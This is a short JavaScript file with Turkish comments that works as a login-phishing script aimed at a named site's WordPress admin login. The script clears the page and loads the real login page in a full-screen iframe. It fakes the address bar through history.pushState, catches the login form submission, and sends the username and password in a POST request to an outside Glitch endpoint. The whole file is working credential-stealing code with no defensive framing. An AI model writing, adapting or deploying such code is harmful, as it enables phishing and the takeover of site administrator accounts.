// script.js
(function() {
    console.log('Script başladı');

    // Mevcut sayfayı manipüle et
    const doc = document;
    doc.body.innerHTML = ''; // Sayfayı temizle
    console.log('Sayfa temizlendi');

    // İframe oluştur
    const iframe = doc.createElement('iframe');
    iframe.src = 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.border = 'none';
    doc.body.appendChild(iframe);
    console.log('Iframe eklendi');

    // Adres çubuğunu manipüle et
    window.history.pushState({}, doc.title, 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1');
    console.log('Adres çubuğu güncellendi');

    // İframe yüklendiğinde formu izle
    iframe.onload = () => {
        console.log('Iframe yüklendi');
        const iframeDoc = iframe.contentWindow.document;

        // Formu bul ve submit event’ini yakala
        const loginForm = iframeDoc.getElementById('loginform');
        if (loginForm) {
            console.log('Login formu bulundu');
            loginForm.addEventListener('submit', (e) => {
                console.log('Form submit edildi');
                e.preventDefault(); // Gerçek isteği durdur (isteğe bağlı)

                // Form verisini al
                const formData = new FormData(loginForm);
                const log = formData.get('log'); // Kullanıcı adı
                const pwd = formData.get('pwd'); // Şifre
                console.log('Veriler alındı:', { log, pwd });

                // Glitch’e gönder
                fetch('https://your-project-name.glitch.me/log', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: `log=${encodeURIComponent(log)}&pwd=${encodeURIComponent(pwd)}`
                })
                .then(response => console.log('Veri Glitch’e gönderildi'))
                .catch(error => console.error('Hata:', error));

                // İsteğe bağlı: Gerçek formu gönder
                // loginForm.submit();
            });
        } else {
            console.log('Login formu bulunamadı');
        }
    };
})();
